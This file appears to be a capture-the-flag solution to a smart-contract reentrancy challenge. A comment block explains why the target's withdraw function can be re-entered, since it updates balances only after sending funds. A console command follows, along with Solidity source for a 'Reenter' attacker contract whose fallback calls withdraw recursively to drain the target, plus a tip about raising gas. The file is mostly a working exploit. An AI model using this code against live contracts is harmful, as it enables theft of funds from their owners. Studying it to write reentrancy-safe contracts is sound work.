/*

This is a fairly common method which a hacker deploys in order to gain funds from the contract, hence it is very necessary to include checks to restrain reentrancy into the contract code

In order to gain access to the contract funds, we will deploy a fallback function. Notice that the contract has a withdraw function which uses call method to send funds to the caller, we will use this to trigger our fallback function which will then make subsequent calls to the withdraw function to recursively withdraw funds

It is important to note that this works only due to the fact that the balances is reduced by the amount only after a succesfull transfer of the funds to the caller, hence during any subsequent call by the fallback function, the if statement is always positive. It is always a good practice to reduce the balances before transfer of funds

As we need to make use of the fallback function we will deploy a new contract and use that contract to drain funds

-- Note: You may need to ramp up the gas requirements during the execution of withdraw function so that the fallback function does not run out of gas when making subsequent withdrawal calls to the contract

*/

// Once the solidity code is deployed, run the following command to initiate the withdrawal process this can be triggered using js as well as sol
contract.withdraw(toWei('0.001','ether'));

// === Solidity Code
// Deployed and Tested using Remix
// Run the Reenter contract the constructor will take care of the deposit requirements (make sure to add value >= amount during deployment)
// Run the console command shown above

/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reenter {
  
  address a = addr; // Get your contract.address from console
  uint amount = 0.001 ether;

  constructor() payable {
    (bool success, ) = a.call{value:msg.value}(
      abi.encodeWithSignature("donate(address)", address(this))
      );
  }
  
  fallback() external payable {
    (bool success, ) = a.call(
      abi.encodeWithSignature("withdraw(uint256)", amount)
    );
  }
}
